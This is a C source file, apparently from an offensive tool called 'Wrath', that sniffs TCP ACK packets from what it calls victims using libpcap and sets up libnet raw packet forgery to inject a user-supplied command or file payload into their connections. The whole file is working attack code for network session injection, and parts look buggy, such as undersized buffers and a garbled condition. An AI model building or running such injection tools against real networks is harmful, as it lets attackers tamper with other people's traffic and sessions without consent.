#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include "wrath-structs.h"

#define ACK_PACKETS "tcp[tcpflags] & tcp-ack != 0"
#define ACK_PACKETS_EXT "tcp[tcpflags] & tcp-ack != 0 and %s"

void wrath_inject(u_char *, const struct pcap_pkthdr *, const u_char *);
// will need to cast the pointer to u_char. (struct arg_vals *) args

// places wrath in the position to capture the victims packets
pcap_t *wrath_position(struct arg_values *cline_args) {
	struct pcap_pkthdr cap_header;
	const u_char *packet, *pkt_data;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	pcap_t *pcap_handle;
	
	if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
		device = pcap_lookupdev(errbuf);
		if(device == NULL) {
			fprintf(stderr, "error fetching interface: %s %s\n", errbuf, "(this program must be run as root)");
			exit(1);
		}
	} else { // if interface is set
		device = cline_args->interface;
	}

	printf("Watching victims on %s\n", device);	

	/* snaplen
	   14 bytes for ethernet header
	   20 bytes for internet protocol header (without options)	   
		-option possibilities
	   20 bytes for transmission control protocol header (without options) 

	   It's a possibility that while sniffing webserver traffic we may want to
	   leave enough room to sniff HEADER information
	*/
	pcap_handle = pcap_open_live(device, 4026, 1, 0, errbuf); //
	if (pcap_handle == NULL)
		pcap_perror(pcap_handle, errbuf);
	
	// parse/compile bpf (if filter is null, skip this step)
	struct bpf_program fp;
		
	char *filter_str;
	filter_str  = (char * ) malloc(sizeof ACK_PACKETS_EXT + strlen(cline_args->filter));
	if (strcmp(cline_args->filter,"\0") != 0) { // if filter is set
		sprintf(filter_str, ACK_PACKETS_EXT, cline_args->filter);
	} else {
		sprintf(filter_str, ACK_PACKETS);
	}
	printf("Victim filter: %s\n", filter_str);

	if ((pcap_compile(pcap_handle, &fp, filter_str, 1, 0)) == -1) {
		pcap_perror(pcap_handle, "[ERROR] compiling filter");
		exit(1); 
	}
	if (pcap_setfilter(pcap_handle, &fp) == -1) {
		pcap_perror(pcap_handle, "[ERROR] setting filter");
		exit(1);
	}

	free(filter_str);
	return pcap_handle;
}

void wrath_observe(struct arg_values *cline_args) {
	struct lcp_package *chp; // contains command-line args, libnet handle (file descriptor), and packet forgery memory
	libnet_t *libnet_handle;
	pcap_t *pcap_handle;
	char libnet_errbuf[LIBNET_ERRBUF_SIZE];
	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	/* initializing bundle */
	chp = (struct lcp_package *) malloc(sizeof (struct lcp_package));
	chp->cline_args = cline_args;

	/* initializing sniffer, getting into position */
	/* might be problems with the pieces of memory for 
	structs created in position, especially errbuf and device */
	pcap_handle = wrath_position(cline_args); 

	/* grabbing device name for libnet */
		if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
			device = pcap_lookupdev(pcap_errbuf);
			if(device == NULL) {
				fprintf(stderr, "error fetching interface: %s %s\n", pcap_errbuf, "(this program must be run as root)");
				exit(1);
			}
		} else { // if interface is set
			device = cline_args->interface;
		}

	// initializing environment for libent in advanced mode
	libnet_handle = libnet_init(LIBNET_RAW4_ADV, device, libnet_errbuf);
	if (libnet_handle == NULL) {
		fprintf(stderr, "trouble initiating libnet interface: %s \n", libnet_errbuf);
		exit(1);
	}
	chp->libnet_handle = libnet_handle;

	// finding payload
	int length;
	char *app_cmd = "\0";
	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
		int app_fd;
		app_fd = open(cline_args->input_file, O_RDONLY, 0);
		if ((length = file_size(app_fd)) == -1)
			fatal_error("getting file size");
		app_cmd = (char *) safe_malloc(length);
		read(app_fd, app_cmd, length);
	} else if (!strcmp(cline_args->command, "\0") != 0) { // If a command has been specified but not an input file
		length = strlen(cline_args->command);
		app_cmd = (unsigned char *) safe_malloc(length);
		strcpy(app_cmd, cline_args->command);
	}	

	// converting and setting payload
	char *app_cmd_con = (char *) malloc(strlen(app_cmd));
	if (strcmp(app_cmd, "\0") != 0) { // if a payload was found
		wrath_char_encode(app_cmd, app_cmd_con);
		free(app_cmd);	
		chp->payload = app_cmd_con;
	} else {
		chp->payload = "\0";		
	}

	printf("Payload: %s\n", chp->payload);
	
	// seeding psuedorandom number generator
	libnet_seed_prand(libnet_handle);

	int cap_amount = -1;
	if (cline_args->count != -1) // if count is set
		cap_amount = cline_args->count;

	pcap_loop(pcap_handle, cap_amount, wrath_inject, (u_char *) chp);
	pcap_close(pcap_handle);

	// getting statistical information
	struct libnet_stats l_stats;

	libnet_stats(libnet_handle, &l_stats);
	printf("Wrath Stats: \n");
	printf("Packets Injected: %d\n", l_stats.packets_sent);

	libnet_destroy(libnet_handle);
	free(app_cmd_con);
	free(chp);
}
